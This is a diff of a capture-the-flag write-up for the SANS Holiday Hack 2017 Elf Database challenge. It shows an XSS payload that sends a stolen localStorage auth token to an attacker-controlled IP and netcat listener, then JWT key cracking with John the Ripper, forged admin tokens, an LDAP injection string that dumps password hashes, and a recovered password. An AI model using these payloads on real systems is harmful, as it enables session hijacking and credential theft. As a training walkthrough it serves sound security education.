@@ -11,96 +11,115 @@ http://edb.northpolechristmastown.com. Who wrote the letter?
    :CUSTOM_ID: q8_background-information
    :END:
 
-Do we know anything about this system already?
+We can pull up the website in a web browser, and we see a login page.
 
-Hints:
+#+CAPTION: Elf Database Login
+#+attr_html: :width 350px
+[[./images/edb_login.png]]
 
-List any useful hints here.
+We can try some of the passwords we've already recovered, without success. However, at the bottom of the page, there's a support link, which pops up this form:
 
-Blog Posts:
+#+CAPTION: Elf Database Login Support
+#+attr_html: :width 350px
+[[./images/edb_login_support.png]]
 
-Are any of these useful?
+Wunorse Openslae provides us the following:
 
-- Putting My Zero Cents In: Using the Free Tier on Amazon Web Services
-  (EC2)
-  https://pen-testing.sans.org/blog/2017/12/10/putting-my-zero-cents-in-using-the-free-tier-on-amazon-web-services-ec2
-  Spinning up an EC2 instance, but also a lot of emphasis on how to use
-  SSH keys.
-- Your Pokemon Guide for Essential SQL Pen Test Commands
-  https://pen-testing.sans.org/blog/2017/12/09/your-pokemon-guide-for-essential-sql-pen-test-commands
-  SQL basics (SELECT, WHERE, wildcards, ORDER BY, GROUP BY, COUNT)
-- Exploiting XXE Vulnerabilities in IIS/.NET
-  https://pen-testing.sans.org/blog/2017/12/08/entity-inception-exploiting-iis-net-with-xxe-vulnerabilities
-  Including remote content in XML
-- Why You Need the Skills to Tinker with Publicly Released Exploit Code
-  https://pen-testing.sans.org/blog/2017/12/05/why-you-need-the-skills-to-tinker-with-publicly-released-exploit-code
-  Mentions Apache struts vulnerabilities, specifically CVE-2017-5638 and
-  CVE-2017-9805 Code: https://github.com/chrisjd20/cve-2017-9805.py
-- Go To The Head Of The Class: LD\_PRELOAD For The Win
-  https://pen-testing.sans.org/blog/2017/12/06/go-to-the-head-of-the-class-ld-preload-for-the-win
-- A Spot of Tee
-  https://pen-testing.sans.org/blog/2017/12/06/a-spot-of-tee Restricted
-  bash shell, and bypassing the I/O restriction with tee
-- Understanding and Exploiting Web-based LDAP
+#+begin_hint
+Many people don't know this, but most of us elves have multiple jobs here in the North Pole. In addition to working in Santa's workshop, I also work as a help desk support associate for the North Pole Elf Database site. I answer password reset requests, mostly from other elves.
+#+end_hint
+#+begin_hint
+One time, I got a weird email with a JavaScript alert and my account got hacked. Fortunately, Alabaster was able to add some filtering on the system to prevent that from happening again. I sure hope he tested his changes against the common evasion techniques discussed on the [[https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet][XSS filter evasion cheat sheet]].
+#+end_hint
+#+begin_hint
+It's never a good idea to come up with your own encryption scheme with cookies. Alabaster told me he uses JWT tokens because they are super secure as long as you use a long and complex key. Otherwise, they could be cracked and recreated using any old framework like [[https://github.com/jpadilla/pyjwt][pyjwt]] to forge a key.
+#+end_hint
+#+begin_hint
+The interface we use lets us query our directory database with all the employee information. Per Santa's request, Alabaster restricted the search results to just the elves and reindeer. Hopefully, he secured that too. I found an article recently talking about [[https://pen-testing.sans.org/blog/2017/11/27/understanding-and-exploiting-web-based-ldap][injection against similar databases]].
+#+end_hint
+
+This blog post is explicitly called out:
+
+  Understanding and Exploiting Web-based LDAP
   https://pen-testing.sans.org/blog/2017/11/27/understanding-and-exploiting-web-based-ldap
-  LDAP syntax, LDAP injection
-- Massively Scaling your Scanning
-  https://pen-testing.sans.org/blog/2017/10/25/massively-scaling-your-scanning
-  masscan
 
 * Goal
    :PROPERTIES:
    :CUSTOM_ID: q8_goal
    :END:
 
-What are we trying to accomplish?
+The hints lay out a pretty clear path: we can use {{abbr(Cross-site Scripting, XSS)}} to send a malicious request to one of the elves or
+reindeer, and then steal their JWT token and access the directory.
 
 * Approach
    :PROPERTIES:
    :CUSTOM_ID: q8_approach
    :END:
 
-Describe the thought process that we tried here. How were we able to use
-the hints or the blog posts?
+** Cross-Site Scripting
 
-* Solution
-   :PROPERTIES:
-   :CUSTOM_ID: q8_solution
-   :END:
-
-Summarize the reference solution that we found
-
-My solution:
-
-This was a multi stage exploit.
-
-The first stage was XSS via the support request.
-
-First I attempted to steal document.cookie, but then i realized the cookie
-didn't help, and one needed the auth token mentioned in the html/javascript
-source:
+The first stage of this attack is our malicious {{abbr(Cross-site Scripting, XSS)}} request. First, we tried to steal the cookie, but in reviewing the code at http://edb.northpolechristmastown.com, we noticed that we needed to steal the token out of local storage:
 
 #+BEGIN_SRC js
-    token = localStorage.getItem("np-auth");
+token = localStorage.getItem("np-auth");
 #+END_SRC
+
+A classic {{abbr(Cross-site Scripting, XSS)}} attack is using the HTML =IMG= tag, and causing Javascript code to run and leak the token to a server we control. This is just one of many options in the [[https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet][OWASP Cheat Sheet]].
+
+#+BEGIN_SRC html
+<IMG SRC=/ onerror="document.location='http://10.142.0.11:4444/?cookie='+localStorage.getItem('np-auth');">
+</IMG>
+#+END_SRC
+
+We'll start a =netcat= listener on the l2s system:
 
 
 on l2s:
 
 #+BEGIN_SRC
-$ nc -v -l -p 4444 on l2s
+$ nc -v -l -p 4444
 #+END_SRC
 
-#+BEGIN_SRC
+Next, we'll submit the support form with our malicious message:
+
+#+BEGIN_SRC sh
 http -v --form --proxy=http:socks5://@localhost:32080  POST http://edb.northpolechristmastown.com/service \
 uid=alabaster.snowball \
 email=alabaster.snowball@northpolechristmastown.com \
 message="<IMG SRC=/ onerror=\"document.location='http://10.142.0.11:4444/?cookie='+localStorage.getItem('np-auth');\"></img>"
 #+END_SRC
 
-With the success of the XSS attack, the stolen token was stored in [output/jwt](output/jwt).
+A few seconds later, back on l2s:
 
-Unfortunately the token had expired 4 months ago, and could no longer be used to create a new session:
+#+BEGIN_SRC 
+GET /?cookie=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJkZXB0IjoiRW5naW5lZXJpbmciLCJvdSI6ImVsZiIsImV4cGlyZXMiOiIyMDE3LTA4LTE2IDEyOjAwOjQ3LjI0ODA5MyswMDowMCIsInVpZCI6ImFsYWJhc3Rlci5zbm93YmFsbCJ9.M7Z4I3CtrWt4SGwfg7mi6V9_4raZE5ehVkI9h04kr6I HTTP/1.1
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Referer: http://127.0.0.1/reset_request?ticket=L78G1-F4X9X-T4FIR-9C4R4
+User-Agent: Mozilla/5.0 (Unknown; Linux x86_64) AppleWebKit/538.1 (KHTML, like Gecko) PhantomJS/2.1.1 Safari/538.1
+Connection: Keep-Alive
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,*
+Host: 10.142.0.11:4444
+#+END_SRC
+
+** JWT Token
+
+With the success of the XSS attack, the stolen token was stored in output/jwt TODO add a real link here.
+
+Great! Now we just need to modify our local storage, similar to how we
+added our cookie for EWA, and refresh the page! ...and nothing
+happens. If we look at the Network tab of the Developer Tools, we'll
+see that there was a request to =/login=, but it returned false:
+
+#+CAPTION: Elf Database Login Failed
+#+attr_html: :width 350px
+[[./images/edb_login_failed.png]]
+
+#+begin_hint
+Alabaster told me he uses JWT tokens because they are super secure as long as you use a long and complex key. Otherwise, they could be cracked and recreated using any old framework like [[https://github.com/jpadilla/pyjwt][pyjwt]] to forge a key.
+#+end_hint
+
+That seems relevant. Let's check out =pyjwt=:
 
 #+BEGIN_SRC python
 >>> import jwt
@@ -109,8 +128,14 @@ Unfortunately the token had expired 4 months ago, and could no longer be used to
 {'dept': 'Engineering', 'ou': 'elf', 'expires': '2017-08-16 12:00:47.248093+00:00', 'uid': 'alabaster.snowball'}
 #+END_SRC
 
-We needed to crack the encryption key in order to forge a new, valid one.  We
-used jwt2john.py and john to crack it.  The Makefile shows the process:
+Unfortunately the token had expired 4 months ago, and could no longer
+be used to create a new session. The hint mentions that the key needs
+to be secure -- but what if it's not? Let's try cracking it. A bit of
+Googling later, we end up at =jwt2john.py=. This can convert the raw
+token into a format that John the Ripper can understand, and then it
+can try to crack it.
+
+Our Makefile shows the process for cracking the key:
 
 #+BEGIN_SRC
 jwt.john: ../tools/jwt2john.py jwt
@@ -121,11 +146,9 @@ john.txt: jwt.john
 	john  --format=HMAC-SHA256 jwt.john -show > john.txt
 #+END_SRC
 
-jwt2john is used to convert the raw jwt token to a file format john can
-understand, and then john is used to crack it:
+To run it, we just run =make john.txt=:
 
 #+BEGIN_SRC
-$ make john.txt
 python3 ../tools/jwt2john.py eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJkZXB0IjoiRW5naW5lZXJpbmciLCJvdSI6ImVsZiIsImV4cGlyZXMiOiIyMDE3LTA4LTE2IDEyOjAwOjQ3LjI0ODA5MyswMDowMCIsInVpZCI6ImFsYWJhc3Rlci5zbm93YmFsbCJ9.M7Z4I3CtrWt4SGwfg7mi6V9_4raZE5ehVkI9h04kr6I > jwt.john
 john  --format=HMAC-SHA256 jwt.john
 Loaded 1 password hash (HMAC-SHA256 [password is key, SHA256 32/64 OpenSSL])
@@ -140,46 +163,163 @@ $ cat john.txt
 ?:3lv3s
 #+END_SRC
 
-Cracking the jwt token took 6 minutes and found that the secret key was =3lv3s=.
+Cracking the jwt token took 6 minutes and found that the secret key was =3lv3s=. Now we can use =pyjwt= again to create a spoofed token:
 
-TODO: show make_jwt.py and alabaster.jwt makefile targets and how it was used to login. using the browser tools
+#+INCLUDE: "../../tools/make_jwt.py" src python
 
-To automate the process [tools/edb.py](tools/edb.py) was written to exploit the ldap injection vuln using the search string
+Plugging in the values from our expired cookie, we get:
 
-#+BEGIN_SRC
-    name=))(department=it)(|(cn=
+#+BEGIN_SRC 
+$ ./make_jwt.py alabaster.snowball Engineering elf
+eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJkZXB0IjoiRW5naW5lZXJpbmciLCJvdSI6ImVsZiIsInVpZCI6ImFsYWJhc3Rlci5zbm93YmFsbCIsImV4cGlyZXMiOiIyMDE4LTA4LTE2IDEyOjAwOjQ3LjI0ODA5MyswMDowMCJ9.iVg7UqgyCSw688qBLv-n7nD5a1sc9bcMnmTkJKEgIGw
 #+END_SRC
 
-and by passing =*= as the attributes query field. With that query and all
-attributes it is able to grab the entire ldap database including password
-hashes.
+We can plug this into our Local Storage, using the Firefox Developer Tools:
 
-The letter page requires a valid password, convienently a google search for santas md5 password quickly finds a valid password.
+#+CAPTION: Updating our Local Storage
+[[./images/edb_local_storage.png]]
+
+Refresh, and...
+
+#+CAPTION: EDB Personnel Search
+[[./images/edb_search.png]]
+
+Poking around a little bit, we see that there's a "Santa Panel." Unfortunately, Alabaster's not authorized for that:
+
+#+CAPTION: EDB Personnel Search
+#+attr_html: :width 350px
+[[./images/edb_must_be_a_clause.png]]
+
+** LDAP Injection
+
+We managed to login to the system, but now let's see what LDAP injection we can do, as we follow the SANS blog post. First, let's see what a standard search looks like, using the Network tab of the Firefox Developer Tools:
+
+#+CAPTION: EDB Search for Elves
+[[./images/edb_test_search.png]]
+
+Why, this looks pretty similar to what the blog post has. On a lark, let's see what happens if we try searching for the LDAP injection example from the blog post:
+
+#+BEGIN_SRC 
+))(department=it)(|(cn=
+#+END_SRC
+
+#+CAPTION: EDB Injection PoC
+[[./images/edb_ldap_injection_success.png]]
+
+That worked. We got a list with elves, reindeers -- even administrators! Now that we have some information on Santa, let's change our cookie to his, and access the Santa Panel:
+
+#+BEGIN_SRC 
+.make_jwt.py santa.claus administrators human
+eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJkZXB0IjoiYWRtaW5pc3RyYXRvcnMiLCJvdSI6Imh1bWFuIiwidWlkIjoic2FudGEuY2xhdXMiLCJleHBpcmVzIjoiMjAxOC0wOC0xNiAxMjowMDo0Ny4yNDgwOTMrMDA6MDAifQ.JQ16hqPVuXmJDqA5PgZ4jMwn9RRQAuPuJhNsXfC5ZYk
+#+END_SRC
+
+#+CAPTION: EDB Santa Panel
+#+attr_html: :width 350px
+[[./images/edb_confirm_password.png]]
+
+Nope. Somehow, we'll need to get passwords from LDAP first. At this
+point, we've managed to query all the entries in LDAP, but the web app
+restricts which fields we can see. The SANS blog post also discusses
+modifying parameters to view extra, or different fields. Let's try:
+
+#+CAPTION: EDB Return All Attributes
+#+attr_html: :width 500px
+[[./images/edb_all_attributes.png]]
+
+#+CAPTION: EDB All Rudolph's Attributes
+#+attr_html: :width 500px
+[[./images/edb_all_attrs_result.png]]
+
+We now have password hashes for all the users! But really, we're after Santa's password. We could try to crack his password, but if we just Google it, it pops up on several sites.
+
+#+begin_note
+Santa's password hash & password originally were =cdabeb96b508f25f97ab0f162eac5a04= and =1iwantacookie=, but this was modified to =d8b4c05a35b0513f302a85c409b4aab3= (=001cookielips001=).
+#+end_note
+
+Armed with that password, we can access the Santa Panel, where we find:
+
+#+CAPTION: Letter to Santa
+#+attr_html: :width 600px
+[[./images/wizard_of_oz_to_santa_d0t011d408nx.png]]
+
+* Solution
+   :PROPERTIES:
+   :CUSTOM_ID: q8_solution
+   :END:
+
+There was a lot of stuff going on in this question. First, we needed to use {{abbr(Cross-site Scripting, XSS)}} to grab a copy of the JWT token, then we had to recover the secret and forge a new token.
+
+Once we logged into the system, we found it was vulnerable to LDAP injection, and were able to dump all the users, and their passwords. Cracking Santa's password allowed us to access the letter from the Wizard of Oz.
+
+We automated this attack with tools/edb.py TODO ADD LINK HERE, which dumps the LDAP database:
+
+#+BEGIN_SRC 
+$ ./edb.py | head
+[
+ [
+  [
+   "cn=rudolph,ou=reindeer,dc=northpolechristmastown,dc=com",
+   {
+    "c": [
+     "US"
+    ],
+    "cn": [
+     "rudolph"
+...
+#+END_SRC
 
 * Alternatives
    :PROPERTIES:
    :CUSTOM_ID: q8_alternatives
    :END:
 
-Any other, easier solutions?
+The website's =robots.txt= page lists a single entry, http://edb.northpolechristmastown.com/dev/, which leads us to this {{abbr(LDAP Data Interchange Format, LDIF)}} file:
 
-* Common Pitfalls
-   :PROPERTIES:
-   :CUSTOM_ID: q8_common-pitfalls
-   :END:
+#+BEGIN_SRC 
+#LDAP LDIF TEMPLATE
 
-Do we know what issue(s) people were running into?
+dn: dc=com
+dc: com
+objectClass: dcObject
 
-Cracking the JWT key was tricky without the propper tools.
-My first python based solution was broken.  A fixed version was too slow.
-running it using pypy helped a bit, but the pyjwt library is not optimized for cracking.
-https://github.com/lmammino/jwt-cracker was a bit faster, but john outperformed
-everything.  The hard part was finding out how to use john to crack a jwt secret key.
+dn: dc=northpolechristmastown,dc=com
+dc: northpolechristmastown
+objectClass: dcObject
+objectClass: organization
 
-* About the Challenge
-   :PROPERTIES:
-   :CUSTOM_ID: q8_about-the-challenge
-   :END:
+dn: ou=human,dc=northpolechristmastown,dc=com
+objectClass: organizationalUnit
+ou: human
 
-How was the challenge setup? Was there a better way to secure this
-system?
+dn: ou=elf,dc=northpolechristmastown,dc=com
+objectClass: organizationalUnit
+ou: elf
+
+dn: ou=reindeer,dc=northpolechristmastown,dc=com
+objectClass: organizationalUnit
+ou: reindeer
+
+dn: cn= ,ou= ,dc=northpolechristmastown,dc=com
+objectClass: addressbookPerson
+cn: 
+sn: 
+gn: 
+profilePath: /path/to/users/profile/image
+uid: 
+ou: 
+department: 
+mail: 
+telephoneNumber: 
+street:
+postOfficeBox: 
+postalCode: 
+postalAddress: 
+st: 
+l: 
+c: 
+facsimileTelephoneNumber: 
+description: 
+userPassword: 
+#+END_SRC
+
+Knowing the LDAP structure would make it easier to pull out the passwords, but much of the work leading up to that would remain the same.
